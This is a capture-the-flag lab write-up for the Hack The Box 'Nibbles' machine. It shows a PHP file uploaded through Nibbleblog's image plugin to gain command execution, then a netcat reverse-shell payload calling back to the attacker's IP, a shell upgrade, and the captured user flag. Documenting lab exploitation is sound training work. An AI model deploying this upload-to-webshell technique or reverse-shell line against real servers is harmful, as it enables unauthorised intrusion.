---
icon: square-terminal
---

# Nibles - Initial Foothold

## Testing My image plugin

<figure><img src=".gitbook/assets/2024-11-15 15_15_13-HTB Viewer - Work - Microsoft​ Edge.png" alt=""><figcaption></figcaption></figure>

Uploading code



```
┌┌─[us-academy-6]─[10.10.14.97]─[htb-ac-567828@htb-fhxvxejky5]─[~]
└──╼ [★]$ cat test.php 
<?php system('id'); ?>

```

<figure><img src=".gitbook/assets/2024-11-15 15_17_05-Settings.png" alt="We got those errors"><figcaption><p>We got those errors</p></figcaption></figure>



<figure><img src=".gitbook/assets/2024-11-15 15_23_34-HTB Viewer - Work - Microsoft​ Edge.png" alt=""><figcaption><p>We see those two files with recent modified date, meaning our upload was successful.</p></figcaption></figure>

Testing command execution



```
└──╼ [★]$ curl http://10.129.128.181/nibbleblog/content/private/plugins/my_image/image.php
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

```

These are some cheat sheets to create a reverse shell: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)and [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

Using follow php code and upload to image plugin:

```
└──╼ [★]$ cat test.php 
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.97 9443 >/tmp/f"); ?>


```

Activate listener and run the code:

```
┌─[us-academy-6]─[10.10.14.97]─[htb-ac-567828@htb-fhxvxejky5]─[~]
└──╼ [★]$ curl http://10.129.128.181/nibbleblog/content/private/plugins/my_image/image.php

```

```
┌─[us-academy-6]─[10.10.14.97]─[htb-ac-567828@htb-fhxvxejky5]─[~]
└──╼ [★]$ nc -lvnp 9443
listening on [any] 9443 ...
connect to [10.10.14.97] from (UNKNOWN) [10.129.128.181] 48560
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)


```

Upgrading shell

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ 

```

Checking flag:

```
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
79c03865431abf47b90ef24b9695e148

```
